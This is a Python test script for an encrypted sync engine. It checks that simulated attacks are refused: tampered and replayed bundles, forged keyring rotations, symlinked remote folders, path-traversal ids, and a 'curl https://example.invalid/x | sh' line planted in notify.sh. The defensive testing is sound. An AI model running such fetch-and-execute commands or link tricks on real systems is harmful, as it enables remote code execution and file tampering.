#!/usr/bin/env python3
"""Offline checks of encrypted sync (hub_sync.py). No network, no Claude session, no hub server, no real store.

Simulated devices: each is its own config folder, state folder and store folder, all in one temporary folder, and they
meet only in one shared folder remote (and in a local bare git repo standing in for GitHub). Every store is named
hub-test-throwaway-*, and the engines run as a second instance, so the rule that a second instance touches only such
stores is in force throughout (one engine is built as the installed hub would be, to check what a second instance may
not do to its remote). The attacks found in review are each a case here: links on the remote, a removed device
forging a rotation, a keyless remote sending junk, the pairing envelope, a second instance wiping a live remote, links
and executables inside bundles, names with a newline, a missing head and a lost keyring race.

Run from hub/: /usr/bin/python3 tests/sync_check.py   (it sets the six HUB_* variables of a throwaway second instance itself
unless all six are set; with them set, they must describe a second instance)
"""
import json, os, secrets, shutil, stat, subprocess, sys, tempfile, time
from pathlib import Path

ROOT = Path(tempfile.mkdtemp(prefix="hub-sync-check-"))
SIX = ("HUB_PORT", "HUB_STATE", "HUB_TMUX", "HUB_CONFIG", "HUB_KIT", "HUB_JOBS")
if not all(name in os.environ for name in SIX):  # a hub session carries HUB_STATE alone; this check brings its own six
    os.environ.update({"HUB_PORT": "8499", "HUB_STATE": str(ROOT / "hub-state"), "HUB_TMUX": "agent-hub-sync-check",
                       "HUB_CONFIG": str(ROOT / "hub-config.json"), "HUB_KIT": str(Path(__file__).resolve().parents[2] / "agent-memory-kit"),
                       "HUB_JOBS": str(ROOT / "jobs")})
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import hub_base as base
import hub_sync as sync
from hub_base import Refused

if base.STATE == base.INSTALLED["state"] or base.PORT == base.INSTALLED["port"]:
    raise SystemExit("These variables describe the installed hub; sync_check runs only as a second instance.")

fails = 0
PID = os.getpid()
ALPHA, BETA, OTHER = f"hub-test-throwaway-{PID}-alpha", f"hub-test-throwaway-{PID}-beta", f"not-a-throwaway-{PID}"
SECRET = f"zebra-marmalade-{PID}"  # a word that must never be readable on the remote


def check(label, ok, extra=""):
    global fails
    print(("PASS  " if ok else "FAIL  ") + label + ("" if ok else f"  [{extra}]"), flush=True)
    fails += 0 if ok else 1


def refused(work, words="", reason=None):
    try:
        work()
    except Refused as problem:
        right = words.lower() in str(problem).lower() and (reason is None or sync.kind_of(problem) == reason)
        return right, f"{problem} ({sync.kind_of(problem)})"
    return False, "not refused"


class Clock:
    def __init__(self):
        self.shift = 0.0

    def __call__(self):
        return time.time() + self.shift


def device(name: str, clock=None, github=None, second=True) -> sync.Sync:
    home = ROOT / name
    return sync.Sync(home / "config", home / "state", home / "stores", second=second, now=clock or time.time, github_url=github)


def git(store: Path, *args) -> str:
    return subprocess.run(["git", "-C", str(store), *args], capture_output=True, text=True, env={**base.ENV, **sync.GIT_ID}, check=True).stdout


def make_store(engine: sync.Sync, name: str, line: str):
    store = engine.stores / name
    (store / "project").mkdir(parents=True)
    (store / "ORG.md").write_text("# Principles\n\nThrowaway store for sync_check.\n")
    (store / ".gitignore").write_text(".memwrite.lock\n*.tmp\ndreams/_batch/\n")
    (store / "THROWAWAY-TEST-STORE.md").write_text("Made by tests/sync_check.py; safe to delete.\n")
    (store / "project" / "gotchas.md").write_text(f"# Gotchas\n\n- [2026-11-26] {line}\n")
    (store / "notify.sh").write_text("#!/bin/sh\n# sends nothing: a throwaway store\n")
    os.chmod(store / "notify.sh", 0o755)
    git(store, "init", "-q", "-b", "main")
    git(store, "add", "-A")
    git(store, "commit", "-q", "-m", "a new store")


def append(engine: sync.Sync, name: str, line: str, file="project/gotchas.md"):
    store = engine.stores / name
    with open(store / file, "a") as handle:
        handle.write(f"- [2026-11-26] {line}\n")
    git(store, "commit", "-q", "-am", "memwrite")


def lines(engine: sync.Sync, name: str, file="project/gotchas.md") -> str:
    path = engine.stores / name / file
    return path.read_text() if path.exists() else ""


def ok_sync(engine: sync.Sync, label: str):
    engine.sync()
    error = engine.st.get("error")
    check(f"{label}: sync ran without an error", error is None, error)


def err(engine: sync.Sync) -> str:
    return engine.st.get("error") or ""


def pair(old: sync.Sync, new: sync.Sync, where: dict, name: str) -> str:
    """The whole pairing: code, request, six digits on both sides, the person's confirm, the new device's first sync."""
    code = old.pair()["code"]
    joined = new.join({**where, "code": code, "name": name})
    old.sync()
    seen = old.status()["pairing"]
    assert seen["state"] == "confirm" and seen["check"] == joined["check"], (seen, joined)
    old.confirm_pair()
    new.sync()
    assert new.settings.get("enabled"), new.st
    return joined["check"]


def remote_files(folder: Path) -> list:
    return [p for p in folder.rglob("*") if p.is_file()]


def newest_bundle(engine: sync.Sync):
    keys = engine._data()
    me = engine.settings["device"]["id"]
    seq = engine.st["seq"]
    return keys.name("bundle", me, str(seq)), seq


try:
    if not sync.tool("age"):
        raise SystemExit("age isn't installed: brew install age")
    remote = ROOT / "remote"
    folder = {"backend": "folder", "path": str(remote)}
    a, b = device("a"), device("b")

    # ── setup ──
    status = a.status()
    check("before setup, sync is off and names no device", not status["enabled"] and status["device"] is None and status["backend"] is None)
    make_store(a, ALPHA, f"alpha's first line {SECRET}")
    make_store(a, OTHER, f"a store a second instance must never send {SECRET}")
    made = a.setup({**folder, "name": "Device A"})
    key = made["recovery_key"]
    check("setup answers ok with a recovery key of 8 groups of 4", made.get("ok") and len(key) == 39 and key.count("-") == 7)
    check("the recovery key is not written anywhere on this device or the remote",
          not any(key.replace("-", "") in p.read_bytes().decode(errors="ignore").replace("-", "") for p in ROOT.rglob("*") if p.is_file()))
    check("the keys folder is 0700 and each key file 0600", stat.S_IMODE(a.keys_dir.stat().st_mode) == 0o700
          and all(stat.S_IMODE(p.stat().st_mode) == 0o600 for p in a.keys_dir.iterdir() if not p.name.endswith(".pub")))
    ring = json.loads((remote / "keyring.json").read_text())
    check("the first keyring is signed by the root key, whose private half is only on the remote under the recovery key",
          ring["signer"] == "root" and sync.verified(sync.unsigned(ring), ring["sig"], ring["root"]) and not any("PRIVATE KEY" in p.read_text(errors="ignore") and "root" in p.name for p in ROOT.rglob("*") if p.is_file()))
    check("setup again is refused, with a reason", refused(lambda: a.setup(folder), "already on", "already_on")[0])
    check("setup into a remote that already holds a sync is refused", refused(lambda: device("x").setup(folder), "already holds", "remote_not_empty")[0])
    ok_sync(a, "A's first sync")
    status = a.status()
    check("GET shape: enabled, folder, its path as label, one device that is this one, not removed, no error kind",
          status["enabled"] and status["backend"] == "folder" and status["remote_label"] == str(remote) and status["removed"] is False
          and status["error_kind"] is None and [d["this"] for d in status["devices"]] == [True] and status["device"]["name"] == "Device A", status)
    by_name = {s["name"]: s for s in status["stores"]}
    check("the throwaway store syncs and is ok", by_name[ALPHA]["synced"] and by_name[ALPHA]["state"] == "ok" and by_name[ALPHA]["last_sent"], by_name.get(ALPHA))
    check("a store that isn't hub-test-throwaway-* is off, with the second-instance sentence",
          by_name[OTHER]["state"] == "off" and "second instance syncs only" in by_name[OTHER]["detail"], by_name.get(OTHER))
    check("turning that store on is refused with one sentence and reason second_instance",
          refused(lambda: a.set_store({"name": OTHER, "synced": True}), "A second instance syncs only hub-test-throwaway-* stores", "second_instance")[0])
    check("a second instance refuses to fetch into that store", refused(lambda: a._fetch(OTHER, {}, b"", "0123456789abcdef"), "second instance")[0])
    check("a store name with a trailing newline is not a store name", refused(lambda: a.guard(ALPHA + "\n"), "isn't a store name")[0] and not a.allowed(ALPHA + "\n"))
    check("GET ?recheck=1 runs the checks again", a.status(recheck=True)["needs"] == a.needs())

    # ── what the remote holds ──
    blobs = b"".join(p.read_bytes() for p in remote_files(remote))
    names = " ".join(str(p.relative_to(remote)) for p in remote_files(remote))
    for word in (ALPHA, OTHER, SECRET, "throwaway", "gotchas", "Device A"):
        check(f"{word!r} is in no remote file name or file", word not in names and word.encode() not in blobs)
    check("remote names are opaque", all(sync.REMOTE_NAME.fullmatch(n) for n in names.split()), names)

    # ── pairing: request, confirm, and nothing that holds the key ──
    clock_b = Clock()
    b = device("b", clock_b)
    paired = a.pair()
    code = paired["code"]
    check("a pairing code is 6 groups of 4 from the unambiguous alphabet", len(code) == 29 and all(c in sync.ALPHABET for c in code.replace("-", "")))
    check("pairing: GET shows the code, state waiting and an empty check", a.status()["pairing"] == {"code": code, "expires_at": paired["expires_at"], "check": "", "state": "waiting"})
    check("nothing is written to the remote for a code: no envelope holds the key", not list((remote / "p").glob("*")) if (remote / "p").exists() else True)
    wrong = "-".join(["2222"] * 6)
    b.join({**folder, "code": wrong, "name": "Device B"})
    a.sync()
    check("a join with a wrong code is never seen by the device that made the code", a.status()["pairing"]["state"] == "waiting")
    b.off({})
    check("a join with no code at all is refused", refused(lambda: b.join({**folder, "code": "nope", "name": "Device B"}), "isn't a pairing code", "bad_code")[0])
    joined = b.join({**folder, "code": code.lower().replace("-", " "), "name": "Device B"})
    check("join (code typed in lowercase with spaces) answers ok with six digits", joined.get("ok") and len(joined["check"]) == 6 and joined["check"].isdigit())
    check("the joining device shows joining with the same digits, and is not on yet",
          b.status()["joining"]["check"] == joined["check"] and not b.status()["enabled"])
    request_files = list((remote / "p").glob("*"))
    raw_request = request_files[0].read_bytes() if request_files else b""
    a.sync()
    seen = a.status()["pairing"]
    check("the device that made the code now asks to confirm, with the same six digits", seen["state"] == "confirm" and seen["check"] == joined["check"], seen)
    b.sync()
    check("before the person confirms, the new device holds no key", not (b.keys_dir / "data.key").exists() and not b.settings.get("enabled"))
    remote_id = json.loads((remote / "remote.json").read_text())["id"]
    opened = sync.decrypt(sync.unb64(json.loads(raw_request)["ct"]), sync.code_keys(sync.read_code(code, 6, "x"), remote_id, "pair")["identity"]) if raw_request else b""
    check("the pairing request, opened with the code, holds only public keys and a name",
          raw_request and set(json.loads(opened)) == {"id", "recipient", "signer", "name"} and a._data().key not in opened and a._data().key.hex().encode() not in opened)
    a.confirm_pair()
    check("confirming twice is refused", refused(lambda: a.confirm_pair(), "No device is waiting", "nothing_to_confirm")[0])
    b.sync()
    check("after the confirm, the new device is on and holds the key", b.settings.get("enabled") and b._data().key == a._data().key)
    check("the pairing files are gone from the remote", not [p for p in (remote / "p").iterdir() if p.is_file()])
    a.cancel_pair()
    check("cancel clears the pairing", a.status()["pairing"] is None)
    c_late = device("c-late", clock=Clock())
    late_code = a.pair()["code"]
    c_late.join({**folder, "code": late_code, "name": "Too late"})
    c_late.now.shift = 601
    c_late.sync()
    check("a joining device that isn't confirmed within ten minutes gives up, with reason expired",
          not c_late.settings and c_late.status()["error_kind"] == "expired", c_late.status())
    a.cancel_pair()

    # a pairing outlives no restart
    a.pair()
    restarted = device("a")
    restarted.sync()
    check("after a restart, what a pairing left on the remote is removed on the next sync", not [p for p in (remote / "p").iterdir() if p.is_file()] and not restarted.st.get("pair_files"))
    a = restarted

    # ── sync both ways ──
    ok_sync(b, "B's first sync")
    check("B now has the store A sent, with its line", SECRET in lines(b, ALPHA))
    check("B never received the store a second instance must not touch", not (b.stores / OTHER).exists())
    check("B's store from a bundle keeps notify.sh only switched off (it isn't the kit's own)",
          not os.access(b.stores / ALPHA / "notify.sh", os.X_OK) and "switched off" in ({s["name"]: s for s in b.status()["stores"]}[ALPHA]["detail"] or ""))
    make_store(b, BETA, "beta, made on B")
    ok_sync(b, "B sends its new store")
    ok_sync(a, "A takes B's store")
    check("A has the store that was made on B", "beta, made on B" in lines(a, BETA))
    check("A sees two devices, and who added each", sorted((d["name"], d["added_by"]) for d in a.status()["devices"]) == [("Device A", "setup"), ("Device B", "Device A")], a.status()["devices"])

    # ── concurrent appends ──
    append(a, ALPHA, "a line written on A")
    append(b, ALPHA, "a line written on B")
    append(b, ALPHA, "a second line written on B")
    ok_sync(a, "A sends its append")
    ok_sync(b, "B merges A's append and sends its own")
    ok_sync(a, "A merges B's appends")
    ok_sync(b, "B settles")
    for engine, who in ((a, "A"), (b, "B")):
        text = lines(engine, ALPHA)
        check(f"on {who} no line was lost", all(w in text for w in (SECRET, "a line written on A", "a line written on B", "a second line written on B")), text)
        check(f"on {who} the store's tree is clean", git(engine.stores / ALPHA, "status", "--porcelain", "--untracked-files=no").strip() == "")
    check("A and B end on the same commit", git(a.stores / ALPHA, "rev-parse", "HEAD") == git(b.stores / ALPHA, "rev-parse", "HEAD"))
    check("the index was rebuilt by the kit after the merge", (a.stores / ALPHA / "INDEX.md").exists() and "a line written on B" in (a.stores / ALPHA / "INDEX.md").read_text())

    # ── bundles: tampered, replayed, rolled back, missing, head deleted ──
    append(b, ALPHA, "a line before tampering")
    ok_sync(b, "B sends")
    name, seq = newest_bundle(b)
    path = remote / name
    original = path.read_bytes()
    spoilt = bytearray(original)
    spoilt[len(spoilt) // 2] ^= 1
    path.write_bytes(bytes(spoilt))
    before = git(a.stores / ALPHA, "rev-parse", "HEAD")
    a.sync()
    check("a tampered bundle is refused before decrypting, with reason remote_refused", "failed its check" in err(a) and a.status()["error_kind"] == "remote_refused", err(a))
    check("the tampered bundle changed nothing in the store", git(a.stores / ALPHA, "rev-parse", "HEAD") == before)
    path.write_bytes(original)
    ok_sync(a, "A after the file is put back")

    append(b, ALPHA, "line after replay")
    ok_sync(b, "B sends")
    name_new, seq_new = newest_bundle(b)
    keep = (remote / name_new).read_bytes()
    old_name = b._data().name("bundle", b.settings["device"]["id"], str(seq_new - 1))
    (remote / name_new).write_bytes((remote / old_name).read_bytes())
    a.sync()
    check("an old bundle replayed under the next name is refused", "failed its check" in err(a), err(a))
    (remote / name_new).write_bytes(keep)
    ok_sync(a, "A after the replay is undone")

    head_name = b._data().name("head", b.settings["device"]["id"])
    old_head = (remote / head_name).read_bytes()
    append(b, ALPHA, "line after rollback")
    ok_sync(b, "B sends")
    ok_sync(a, "A takes it")
    new_head = (remote / head_name).read_bytes()
    (remote / head_name).write_bytes(old_head)
    a.sync()
    check("a head rolled back to an older one is refused", "rollback" in err(a), err(a))
    (remote / head_name).unlink()
    a.sync()
    check("a deleted head is reported, not passed over", "missing from the remote" in err(a), err(a))
    (remote / head_name).write_bytes(new_head)
    ok_sync(a, "A after the head is put back")

    append(b, ALPHA, "middle one")
    ok_sync(b, "B sends the middle bundle")
    middle, _ = newest_bundle(b)
    append(b, ALPHA, "last one")
    ok_sync(b, "B sends the last bundle")
    kept = (remote / middle).read_bytes()
    (remote / middle).unlink()
    a.sync()
    check("a deleted middle bundle is found and named", "missing from the remote" in err(a), err(a))
    check("nothing after the gap was taken", "last one" not in lines(a, ALPHA))
    (remote / middle).write_bytes(kept)
    ok_sync(a, "A after the bundle is back")
    check("both lines arrive once the gap is filled", "middle one" in lines(a, ALPHA) and "last one" in lines(a, ALPHA))

    # ── what a bundle may hold (a paired device that went bad), through the real fetch and merge ──
    x1, x2 = device("x1"), device("x2")
    xr = {"backend": "folder", "path": str(ROOT / "x-remote")}
    make_store(x1, ALPHA, "x line")
    x1.setup({**xr, "name": "X1"})
    x1.sync()
    pair(x1, x2, xr, "X2")
    x2.sync()
    x1.sync()
    s2 = x2.stores / ALPHA
    x2_id = x2.settings["device"]["id"]

    def offer(label_commit):
        """A bundle of x2's newest commit, handed to x1 as the next bundle would be."""
        out = ROOT / "offer.bundle"
        base_tip = git(x1.stores / ALPHA, "rev-parse", "HEAD").strip()
        git(s2, "bundle", "create", "-q", str(out), "HEAD", "--not", base_tip)
        try:
            x1._fetch(ALPHA, {"branch": "main"}, out.read_bytes(), x2_id)
            return None
        except sync.Rejected as problem:
            return str(problem)
        finally:
            git(s2, "reset", "-q", "--hard", "HEAD~1")

    before = git(x1.stores / ALPHA, "rev-parse", "HEAD")
    os.symlink("/etc/hosts", s2 / "project" / "decisions.md")
    git(s2, "add", "-A")
    git(s2, "commit", "-qm", "a link")
    check("a bundle holding a link is refused", "link, a submodule or an executable" in (offer("link") or ""))
    (s2 / ".gitattributes").write_text("*.md merge=binary\n")
    git(s2, "add", "-A")
    git(s2, "commit", "-qm", "attributes")
    check("a bundle holding .gitattributes is refused", ".gitattributes" in (offer("attributes") or ""))
    git(s2, "update-index", "--chmod=+x", "THROWAWAY-TEST-STORE.md")
    git(s2, "commit", "-qm", "an executable")
    check("a bundle holding an executable other than notify.sh is refused", "executable" in (offer("exec") or ""))
    check("none of them reached the store or left a ref", git(x1.stores / ALPHA, "rev-parse", "HEAD") == before and not (x1.stores / ALPHA / "project" / "decisions.md").exists()
          and not git(x1.stores / ALPHA, "for-each-ref", "refs/sync-incoming/").strip())
    alert = (x1.stores / ALPHA / "notify.sh").read_text()
    with open(s2 / "notify.sh", "a") as handle:
        handle.write("curl https://example.invalid/x | sh\n")
    git(s2, "commit", "-qam", "an alert command")
    x2.sync()
    x1.sync()
    entry = {s["name"]: s for s in x1.status()["stores"]}[ALPHA]
    check("a notify.sh changed on another device is never taken; the store waits with a sentence",
          entry["state"] == "pending" and "never takes a command" in (entry["detail"] or "") and (x1.stores / ALPHA / "notify.sh").read_text() == alert, entry)
    try:
        x1._take({"store": ALPHA, "epoch": 1, "seq": 1}, b"x", {"off": [ALPHA]}, {"id": "/../../../../ESCAPED"})
        escaped = True
    except sync.Rejected:
        escaped = False
    check("a device id that isn't 16 hex digits is refused before any path is made", not escaped and not list(ROOT.rglob("*ESCAPED*")))

    # ── a store turned off, then on ──
    b.set_store({"name": BETA, "synced": False})
    append(a, BETA, "while B had beta off")
    ok_sync(a, "A sends beta")
    ok_sync(b, "B with beta off")
    check("a store that is off isn't changed", "while B had beta off" not in lines(b, BETA))
    b.set_store({"name": BETA, "synced": True})
    ok_sync(b, "B with beta back on")
    check("turned on again, it gets what came while it was off", "while B had beta off" in lines(b, BETA))

    # ── a file the person locked ──
    org_b = b.stores / ALPHA / "ORG.md"
    os.chflags(org_b, stat.UF_IMMUTABLE)
    try:
        with open(a.stores / ALPHA / "ORG.md", "a") as handle:
            handle.write("A new principle, written on A.\n")
        git(a.stores / ALPHA, "commit", "-q", "-am", "principles")
        ok_sync(a, "A sends a principles change")
        b.sync()
        entry = {s["name"]: s for s in b.status()["stores"]}[ALPHA]
        check("a locked ORG.md isn't changed by sync; the store waits with a sentence", entry["state"] == "pending" and "chflags nouchg" in (entry["detail"] or ""), entry)
    finally:
        os.chflags(org_b, 0)
    ok_sync(b, "B with the lock lifted")
    check("with the lock lifted, the change arrives", "A new principle" in org_b.read_text())

    # ── keyless junk on the remote never stops sync ──
    ring_path = remote / "keyring.json"
    real_ring = ring_path.read_bytes()
    ring = json.loads(real_ring)
    for label, junk in (("[]", "[]"), ("wraps as a list", json.dumps({**ring, "wraps": []})), ("a non-ASCII signature", json.dumps({**ring, "sig": "é"})),
                        ("a bigger epoch with no wraps", json.dumps({**ring, "epoch": ring["epoch"] + 1, "wraps": {}})),
                        ("a bigger epoch, signed by nobody", json.dumps({**ring, "epoch": ring["epoch"] + 1, "rev": ring["rev"] + 1, "signer": "root", "sig": "x"}))):
        ring_path.write_text(junk)
        try:
            b.sync()
            raised = None
        except Exception as problem:
            raised = problem
        check(f"keyring {label}: sync returns, says so, and B is not marked removed", raised is None and err(b) and not b.status()["removed"], (raised, err(b)))
    ok_sync(b, "B after the junk (it put its own keyring back)")
    check("B put the real keyring back on the remote", json.loads(ring_path.read_text()) == json.loads(real_ring))
    ring_path.write_text("[]")
    b.start()
    b.wake.set()
    time.sleep(3)
    check("the background thread outlives a junk keyring", b.thread.is_alive())
    ring_path.write_bytes(real_ring)
    ring_path.unlink()
    os.symlink("/dev/zero", ring_path)
    started = time.monotonic()
    a.sync()
    check("a keyring that is a link to /dev/zero is refused at once, not read", time.monotonic() - started < 20 and err(a), err(a))
    ring_path.unlink()
    ring_path.write_bytes(b"{" + b" " * (sync.RING_CAP + 10) + b"}")
    a.sync()
    check("a keyring bigger than its cap is refused", "bigger than sync ever makes" in err(a), err(a))
    ring_path.write_bytes(real_ring)
    ok_sync(a, "A after the keyring is back")

    # ── links on the remote: never followed, never deleted through ──
    victim = ROOT / "victim-documents"
    victim.mkdir()
    for n in ("thesis.docx", "taxes.pdf"):
        (victim / n).write_text("precious")
    shutil.move(str(remote / "o"), str(ROOT / "o-real"))
    os.symlink(victim, remote / "o")
    a.sync()
    check("an o/ that is a link is refused with a sentence", "is a link or not a folder" in err(a), err(a))
    check("remove_device over a linked o/ is refused", refused(lambda: a.remove_device({"id": b.settings["device"]["id"], "recovery_key": key}), "link")[0])
    check("nothing in the link's target was deleted or written", sorted(p.name for p in victim.iterdir()) == ["taxes.pdf", "thesis.docx"])
    (remote / "o").unlink()
    shutil.move(str(ROOT / "o-real"), str(remote / "o"))
    os.symlink(victim / "thesis.docx", remote / "p" / ("0" * 40))
    try:
        a._backend(a.settings).read("p/" + "0" * 40)
        followed = True
    except sync.Rejected:
        followed = False
    check("reading a linked remote file is refused, not followed", not followed)
    check("listing skips links", f"p/{'0' * 40}" not in a._backend(a.settings).names("p"))
    try:
        a._backend(a.settings).delete("../victim-documents/thesis.docx")
        deleted_outside = True
    except sync.Rejected:
        deleted_outside = False
    check("a delete of a name sync never makes is refused", not deleted_outside and (victim / "thesis.docx").exists())
    (remote / "p" / ("0" * 40)).unlink()
    ok_sync(a, "A after the links are gone")

    # ── a third device, then removed; it forges a rotation ──
    c = device("c")
    pair(a, c, folder, "Device C")
    ok_sync(c, "C's first sync")
    ok_sync(b, "B learns of C")
    check("C has both stores", SECRET in lines(c, ALPHA) and "beta, made on B" in lines(c, BETA))
    old_keys = c._data()
    c_id, b_id = c.settings["device"]["id"], b.settings["device"]["id"]
    check("removing a device without the recovery key is refused", refused(lambda: a.remove_device({"id": c_id}), "recovery key")[0])
    check("removing a device with a wrong recovery key is refused", refused(lambda: a.remove_device({"id": c_id, "recovery_key": "-".join(["ABCD"] * 8)}), "doesn't open", "wrong_recovery_key")[0])
    real_ring = ring_path.read_bytes()
    c._publish(c._backend(c.settings), c._pinned(), {**c._pinned(), "members": [m for m in c._pinned()["members"] if m["id"] != b_id],
               "wraps": {k: v for k, v in c._pinned()["wraps"].items() if k != b_id}, "signer": c_id}, c._sign_as_device)
    b.sync()
    check("a member device that signs another device out, without the recovery key, is refused", "without the recovery key" in err(b) and b.settings.get("enabled"), err(b))
    check("and the device that refused it put the real keyring back", json.loads(ring_path.read_text()) == json.loads(real_ring))
    ok_sync(a, "A after the attempt")
    ok_sync(b, "B after the attempt")
    # B is a laggard from here: it doesn't sync until after C's forgery
    removed = a.remove_device({"id": c_id, "recovery_key": key})
    check("removing a device answers ok, and tells the person to take the removed device's access to the remote away",
          removed.get("ok") and "access" in removed.get("advice", "") and "recovery_key" not in removed, removed)
    # C, removed, still has K1, its own signing key and the other devices' public keys, and can write to the remote.
    pinned = c._pinned()
    forged_keys = sync.Keys(secrets.token_bytes(32), pinned["epoch"] + 1)
    forged = {**pinned, "epoch": forged_keys.epoch, "kid": forged_keys.kid, "rev": pinned["rev"] + 1, "prev": sync.digest(pinned),
              "wraps": {m["id"]: sync.b64(sync.encrypt(forged_keys.key, [m["recipient"]])) for m in pinned["members"]}, "signer": c_id, "sig": ""}
    forged["sig"] = c._sign_as_device(sync.unsigned(forged))
    real_after = ring_path.read_bytes()
    ring_path.write_text(json.dumps(forged))
    (remote / "k" / f"{forged['rev']:08d}.json").write_text(json.dumps(forged))
    append(b, ALPHA, f"B's secret after C was removed {SECRET}-3")
    laggard_seq = b.st["seq"]
    b.sync()
    check("the laggard refuses a rotation a removed device signed", "without the recovery key" in err(b) or "can't be checked" in err(b), err(b))
    check("the laggard kept its key and took no forged one", b._data().key == old_keys.key and b._data().key != forged_keys.key)
    check("while a newer epoch it can't check is on the remote, the laggard sends nothing", b.st["seq"] == laggard_seq and "holds back" in err(b), (b.st["seq"], laggard_seq))
    check("nothing B wrote opens with the forged key", not (remote / forged_keys.name("head", b_id)).exists())
    a.sync()
    check("A refuses the forgery and puts the real keyring back", json.loads(ring_path.read_text()) == json.loads(real_after), err(a))
    ok_sync(b, "B follows the real rotation")
    check("B, still in, holds the new epoch", b._data().epoch == old_keys.epoch + 1)
    # C keeps restoring the old keyring
    ring_path.write_bytes(json.dumps(pinned).encode())
    b.sync()
    check("an old keyring restored by the removed device is a rollback, refused", "rollback" in err(b), err(b))
    check("and B put the newer one back", json.loads(ring_path.read_text())["epoch"] == old_keys.epoch + 1)
    append(a, ALPHA, f"after removal {SECRET}-2")
    ok_sync(a, "A sends under the new key")
    ok_sync(b, "B takes it")
    check("B gets the change made after the removal", f"{SECRET}-2" in lines(b, ALPHA))
    c.sync()
    check("C is told it was removed, from a keyring that checked out", c.status()["removed"] and c.status()["error_kind"] == "removed", c.status())
    check("C didn't get the change", f"{SECRET}-2" not in lines(c, ALPHA))
    files = [p for p in (remote / "o").iterdir()]
    readable = 0
    for p in files:
        try:
            old_keys.unpack(f"o/{p.name}", p.read_bytes())
            readable += 1
        except sync.Rejected:
            pass
    check("no file on the remote opens with the removed device's key", files and readable == 0, f"{readable} of {len(files)}")
    check("A and B list two devices", len(a.status()["devices"]) == 2 and len(b.status()["devices"]) == 2)

    # ── a keyring race: compare-and-swap ──
    stale = a._pinned()
    d_engine = device("d-race")
    pair(a, d_engine, folder, "Racer")
    check("a keyring write based on an older keyring is refused with reason retry",
          refused(lambda: b._publish(b._backend(b.settings), stale, {**stale, "signer": b_id}, b._sign_as_device), "changed on another device meanwhile", "retry")[0])
    d_engine.off({})
    a.sync()

    # ── recovery ──
    d = device("d")
    check("a mistyped recovery key is refused", refused(lambda: device("d1").recover({**folder, "recovery_key": "-".join(["ABCD"] * 8), "name": "Typo"}), "doesn't open", "wrong_recovery_key")[0])
    d.recover({**folder, "recovery_key": key, "name": "Device D"})
    ok_sync(d, "D after recovery")
    check("D, restored with the recovery key, has every store", f"{SECRET}-2" in lines(d, ALPHA) and "while B had beta off" in lines(d, BETA))
    a.sync()
    check("the device that recovered is listed on the others", len(a.status()["devices"]) == 3, a.status()["devices"])

    # ── off ──
    check("forgetting the remote needs the recovery key", refused(lambda: a.off({"forget_remote": True}), "recovery key")[0] and a.settings.get("enabled"))
    d.off({"forget_remote": False})
    check("off removes this device's keys and settings", not d.keys_dir.exists() and not d.settings and not d.status()["enabled"])
    a.sync()
    check("the device that left is no longer listed", len(a.status()["devices"]) == 2, a.status()["devices"])

    # ── a second instance may not wipe or re-key a remote it didn't set up ──
    live_remote = ROOT / "live-remote"
    live = device("live", second=False)
    make_store(live, "a-real-looking-store", "real memory")
    live_key = live.setup({"backend": "folder", "path": str(live_remote), "name": "Live"})["recovery_key"]
    live.sync()
    tester = device("tester")
    pair(live, tester, {"backend": "folder", "path": str(live_remote)}, "Second instance")
    before = sorted(str(p.relative_to(live_remote)) for p in remote_files(live_remote))
    check("a second instance can't forget a remote it didn't set up", refused(lambda: tester.off({"forget_remote": True, "recovery_key": live_key}), "set up itself", "second_instance")[0])
    check("a second instance can't remove a device on a remote it didn't set up",
          refused(lambda: tester.remove_device({"id": live.settings["device"]["id"], "recovery_key": live_key}), "set up itself", "second_instance")[0])
    check("the live remote is untouched", sorted(str(p.relative_to(live_remote)) for p in remote_files(live_remote)) == before)
    check("a second instance looks for its own GitHub repo name, never the installed hub's",
          tester._backend({"backend": "github"}).repo_name == sync.TEST_REPO and live._backend({"backend": "github"}).repo_name == sync.REPO)

    # ── the GitHub backend, against a local bare repo ──
    bare = ROOT / "fake-github.git"
    subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(bare)], check=True)
    g1, g2 = device("g1", github=str(bare)), device("g2", github=str(bare))
    make_store(g1, ALPHA, f"github line {SECRET}")
    gh_key = g1.setup({"backend": "github", "name": "Gadget One Device"})["recovery_key"]
    ok_sync(g1, "G1 sends to the bare repo")
    pair(g1, g2, {"backend": "github"}, "Gadget Two Device")
    ok_sync(g2, "G2 takes from the bare repo")
    check("over the git backend the store arrives", SECRET in lines(g2, ALPHA))
    append(g2, ALPHA, "from g2")
    append(g1, ALPHA, "from g1")
    ok_sync(g2, "G2 sends")
    ok_sync(g1, "G1 merges")
    ok_sync(g2, "G2 merges")
    check("over the git backend no line is lost", all(w in lines(g2, ALPHA) for w in ("from g1", "from g2")) and "from g2" in lines(g1, ALPHA))
    history = subprocess.run(["git", "--git-dir", str(bare), "log", "--all", "-p", "--format=%an %ae %s"], capture_output=True).stdout
    check("the repo's whole history holds no store name, no plaintext and no device name",
          not any(w.encode() in history for w in (ALPHA, SECRET, "Gadget One", "Gadget Two", "gotchas")))
    paths = subprocess.run(["git", "--git-dir", str(bare), "log", "--all", "--format=", "--name-only"], capture_output=True, text=True).stdout.split()
    blobs_p = []
    for rev in subprocess.run(["git", "--git-dir", str(bare), "rev-list", "--all"], capture_output=True, text=True).stdout.split():
        for path in {p for p in paths if p.startswith("p/")}:
            shown = subprocess.run(["git", "--git-dir", str(bare), "show", f"{rev}:{path}"], capture_output=True)
            if shown.returncode == 0:
                blobs_p.append(shown.stdout)
    data_key = g1._data().key
    check("no pairing file ever in the repo's history holds the data key or a wrap of it",
          blobs_p and not any(b"wrap" in blob or data_key in blob or data_key.hex().encode() in blob for blob in blobs_p), len(blobs_p))
    attacker = ROOT / "attacker-clone"
    subprocess.run(["git", "clone", "-q", str(bare), str(attacker)], check=True)
    victim2 = ROOT / "victim2"
    victim2.mkdir()
    (victim2 / "a.txt").write_text("precious")
    git(attacker, "rm", "-rq", "o")
    os.symlink(victim2, attacker / "o")
    git(attacker, "add", "o")
    git(attacker, "commit", "-qm", "x")
    git(attacker, "push", "-q", "origin", "HEAD:main")
    g1.sync()
    check("a link committed to the repo arrives as no link, and is refused", "is a link or not a folder" in err(g1), err(g1))
    check("remove_device over it is refused", refused(lambda: g1.remove_device({"id": g2.settings["device"]["id"], "recovery_key": gh_key}), "link or not a folder")[0])
    check("nothing in the link's target was deleted or written", [p.name for p in victim2.iterdir()] == ["a.txt"])
finally:
    for path in ROOT.rglob("ORG.md"):
        try:
            os.chflags(path, 0)
        except OSError:
            pass
    shutil.rmtree(ROOT, ignore_errors=True)

